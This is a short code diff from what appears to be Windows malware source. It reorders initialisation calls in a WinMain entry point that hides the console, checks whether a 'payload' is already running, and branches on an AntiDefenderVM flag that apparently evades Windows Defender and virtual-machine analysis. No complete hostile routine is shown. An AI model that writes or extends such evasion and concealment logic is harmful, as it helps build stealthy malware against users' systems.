@@ -108,13 +108,15 @@ void test() {
 // Hide Console
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
 // int main() {
+	test();
+	initAllFunc();
+
 
 	if (isPayloadRunning()) {
 		return 0;
 	}
 
-	test();
-	initAllFunc();
+
 
 
 	if (AntiDefenderVM) {
